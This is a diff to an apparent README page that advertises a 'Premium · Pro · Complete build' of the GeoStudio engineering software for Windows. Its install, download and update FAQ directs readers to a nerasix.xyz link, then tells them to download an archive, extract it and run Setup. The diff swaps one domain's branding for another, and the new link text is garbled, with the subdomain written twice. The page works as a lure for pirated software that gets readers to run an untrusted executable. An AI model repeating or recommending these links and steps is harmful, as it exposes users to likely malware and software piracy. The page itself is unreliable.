@@ -54,17 +54,17 @@ Premium · Pro · Complete build · Windows
 
 <details>
 <summary>&nbsp;<b>How to install?</b></summary>
-<br>Open <a href="https://geostudio-advanced-engineering-build.nerasix.xyz/">geostudio-advanced-engineering-build.nexpath.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
+<br>Open <a href="https://geostudio-advanced-engineering-build.nerasix.xyz/">geostudio-advanced-engineering-build.geostudio-advanced-engineering-build.nerasix.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
 </details>
 
 <details>
 <summary>&nbsp;<b>Download didn't start?</b></summary>
-<br>Use the manual link on the NexPath download page, or open <a href="https://geostudio-advanced-engineering-build.nerasix.xyz/">geostudio-advanced-engineering-build.nexpath.xyz</a> directly in your browser.
+<br>Use the manual link on the Nerasix download page, or open <a href="https://geostudio-advanced-engineering-build.nerasix.xyz/">geostudio-advanced-engineering-build.geostudio-advanced-engineering-build.nerasix.xyz</a> directly in your browser.
 </details>
 
 <details>
 <summary>&nbsp;<b>Updates?</b></summary>
-<br>Open <a href="https://geostudio-advanced-engineering-build.nerasix.xyz/">geostudio-advanced-engineering-build.nexpath.xyz</a> again and download the latest version from NexPath.
+<br>Open <a href="https://geostudio-advanced-engineering-build.nerasix.xyz/">geostudio-advanced-engineering-build.geostudio-advanced-engineering-build.nerasix.xyz</a> again and download the latest version from Nerasix.
 </details>
 <details>
 <summary>&nbsp;<b>Requirements?</b></summary>
